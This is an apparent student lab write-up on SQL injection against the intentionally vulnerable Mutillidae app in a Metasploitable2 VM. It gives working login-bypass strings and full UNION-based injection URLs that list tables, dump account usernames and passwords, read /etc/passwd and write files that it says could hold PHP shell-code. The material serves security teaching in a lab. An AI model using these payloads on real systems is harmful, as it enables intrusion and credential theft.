# LAB08: SQL Injection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 


Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/df8044f9-66f8-4694-a59e-cfd0901d900d)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/ba77875e-b6d1-42f7-960b-022237dc215a)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/ee8b9c1b-326b-4846-aa10-02047b36b214)

Click on the menu Login/Register and register for an account

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/f6fb65df-581e-4d8a-ba5f-025e070edac4)

Click on the link “Please register here”

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/fc0f993a-e280-468b-a414-246758c8236d)

Click on “Create Account” to display the following page:


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/7bc82783-2b0a-4f2b-b50a-3ea12da1a9e3)


Click “Login”. The logged in page will show as below:

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/a710766e-b13f-4d0e-9ba3-9ea2e5a009ef)


## Bypassing login field

##### The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
##### =================================================================
If you face error in registration follow the following steps in metasploitable 2:

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/e8418dcd-6633-4560-a5fb-2d0dd3a8aa9e)


This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo vim /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once vim opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/aeef9b41-9e65-40cc-afaf-c5242798e29f)


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/83db31be-7d7e-4487-82d7-a90331dacb30)


Save and exit the config.inc
Save than exit the config.inc file by typing :wq keys on your keyboard to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/0d0fdf23-9e58-4150-b097-a509fe5ce9e1)


 Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/bb1b1d76-ba3e-48e6-b077-5e1f413973e9)


Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4028dccb-ecec-4f4a-b25c-2bd19b6d3d22)

===============================================================

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/7bf8cf88-6360-4e1a-a1a7-2c75881bb738)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/a9f7e5f3-eb15-47ca-aef6-c9f11ddd7e6d)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:


![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/02128a12-ab7a-49a9-937f-9247c2b2d381)

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/56f0e633-2e7b-412c-b0ec-e997f832dd8b)
![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/72aea5ad-761f-430d-b45d-302d80fac7d8)


![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/498a6384-e743-4172-b3ba-6d77ccbb90ea)
![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/f31ea331-33c2-440c-b84a-fcf7cc8b1b5c)



From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.



![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/204b1824-276f-4a79-8b54-854db04b0ea0)




Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4ce331d4-991c-4386-836f-9ec288826e97)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/56faefeb-442f-414c-8b83-f7a0d7586a6b)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/21a6ba06-2f95-4a1a-b33f-62526582c9f5)

 As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/76136de5-bf6e-404d-be18-29c128291557)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/413d5c64-727f-4fd3-87c4-55a9895fefed)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/8efccd5e-3629-4a0e-b974-a7d8d1907637)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/d69b786b-122e-4676-99df-ed71d08c2075)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/58164b10-70cf-4180-8808-1170e8ca8bd1)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.


![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4341dcbe-1e07-4660-b9f3-3abe80330479)




The column names of the accounts is displayed below for the following url:


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4f649edd-cb7b-4053-9209-8dcd7977c675)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/8b3b5065-eae8-48cb-a650-ac6b176c776c)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/506229d4-6a7a-40dc-8c37-9b2848031885)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
